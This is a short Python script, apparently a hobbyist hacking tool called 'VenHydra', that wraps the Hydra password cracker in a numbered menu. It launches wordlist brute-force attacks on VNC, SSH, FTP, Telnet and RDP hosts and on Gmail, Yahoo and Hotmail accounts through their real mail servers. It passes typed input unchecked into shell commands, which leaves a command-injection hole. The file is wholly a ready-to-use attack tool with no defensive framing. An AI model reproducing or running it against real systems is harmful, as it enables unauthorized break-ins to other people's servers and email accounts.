import os
import sys
 
list = """
 
========<[VenHydra]>========
 
[1] VNC Bruteforce
[2] SSH Bruteforce
[3] FTP Bruteforce
[4] TELNET Bruteforce
[5] RDP Bruteforce
[6] YAHOO Bruteforce
[7] HOTMAIL Bruteforce
[8] GMAIL Bruteforce
 
"""
 
def vnc():
    word = raw_input("[+] Wordlist : ")
    iphost = raw_input("[+] IP/Hostname : ")
    os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
 
def ftp():
   
    iphost = raw_input("[+] IP/Hostname : ")
    user = raw_input("[+] User : ")
    word = raw_input("[+] Wordlist : ")
    os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
    sys.exit()
def gmail():
    email = raw_input("[+] Email : ")
    word = raw_input("[+] Wordlist : ")
    os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
    sys.exit()
 
def ssh():
    user = raw_input("[+] User : ")
    word = raw_input("[+] Wordlist : ")
    iphost = raw_input("[+] IP/Hostname : ")
    os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
    sys.exit()
 
 
def telnet():
    user = raw_input("[+] User : ")
    word = raw_input("[+] Wordlist : ")
    iphost = raw_input("[+] IP/Hostname : ")
    os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
    sys.exit()
 
def yahoo():
    email = raw_input("[+] Email : ")
    word = raw_input("[+] Wordlist : ")
    os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
    sys.exit()
def hotmail():
    email = raw_input("[+] Email : ")
    word = raw_input("[+] Wordlist : ")
    os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
    sys.exit()
   
def rdp():
    user = raw_input("[+] User : ")
    word = raw_input("[+] Wordlist : ")
    iphost = raw_input("[+] IP/Hostname : ")
    os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
    sys.exit()
 
 
 
####COD3D BY V3N0M
 
def main():
    v_dra = input("[+] Choose one: ")
    if v_dra == 1:
        vnc()
    elif v_dra == 2:
        ssh()
    elif v_dra == 3:
        ftp()
    elif v_dra == 4:
        telnet()
    elif v_dra == 5:
        rdp()
    elif v_dra == 6:
        yahoo()
    elif v_dra == 7:
        hotmail()
    elif v_dra == 8:
        gmail()
    else:
        print("Wrong Command")
 
if __name__ == "__main__":
    os.system('clear')
    print(list)
 
    main()
